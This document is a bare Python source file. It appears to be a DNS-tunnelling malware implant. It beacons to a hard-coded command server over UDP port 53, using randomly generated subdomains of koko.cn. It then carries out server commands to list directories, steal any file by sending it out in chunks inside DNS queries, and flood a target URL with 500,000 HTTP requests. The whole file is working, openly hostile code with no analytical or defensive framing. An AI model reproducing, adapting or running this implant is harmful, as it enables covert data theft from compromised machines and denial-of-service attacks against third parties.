import socket
import struct
from base64 import *
from binascii import *
import string
import random
import os
import requests

host, port = '10.0.0.19', 53

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
prefix = unhexlify('945800000001000000000000')
suffix = unhexlify('00100001')

def dga():
	letter = string.ascii_lowercase
	fake_domain = ''.join(random.choice(letter) for i in range(random.randrange(15,30)))
	fake_domain = fake_domain.encode()
	lenght = struct.pack('b',len(fake_domain))
	fake_domain =  b'\x010'+ lenght + fake_domain +  b'\x04koko\x02cn\x00'
	return fake_domain

def build_data(data):
	n = 30
	data = [data[i:i+n] for i in range(0,len(data),n)]
	for i in range(len(data)):
		tmp = hexlify(data[i].encode()).encode()
		lenght = struct.pack('b',len(tmp))
		data[i] = prefix + b'\x03{}'.format(b'con') + lenght + tmp + b'\x04koko\x02cn\x00' +suffix
	return data


while True:
	fake_domain = dga()
	hello = prefix + fake_domain + suffix
	s.sendto(hello,(host,port))
	data = s.recv(1024)
	print("OK")
	cmd = ''
	for i in range(len(data)):
		if(data[12+i] == '\x00'):
			cmd = data[12+i+17:]
			break
	cmd = b64decode(cmd).split(',')
	if (len(cmd) == 2):
		#LIST DIR
		if (cmd[0] == 'list'):
			ls = str(os.listdir(cmd[1]))
			ls = build_data(ls)
			for i in range(len(ls)):
				if (i == (len(ls) - 1)):
					ls[i] = ls[i].replace(b'con',b'end')
				s.sendto(ls[i], (host,port))
				print('Sended')
		#DDOS
		elif (cmd[0] == 'ddos'):
			print("[+] DDOS-ing")
			for i in range(500000):
				requests.get('http://' + cmd[1])
		#READ CONTENT OF A FILE
		elif (cmd[0] == 'steal'):
			content = open(cmd[1], 'rb').read()
			content = build_data(content)
			for i in range(len(content)):
				if (i == (len(content) - 1 )):
					content[i] = content[i].replace(b'con',b'end')
				s.sendto(content[i], (host,port))
				print("Sended")

	elif (cmd[0] == 'list'):
		ls = str(os.listdir('.'))
		ls = build_data(ls)
		for i in range(len(ls)):
			s.sendto(ls[i], (host,port))
			print('Sended')
	else:
		s.sendto(hello, (host, port))
		s.recv(1024)







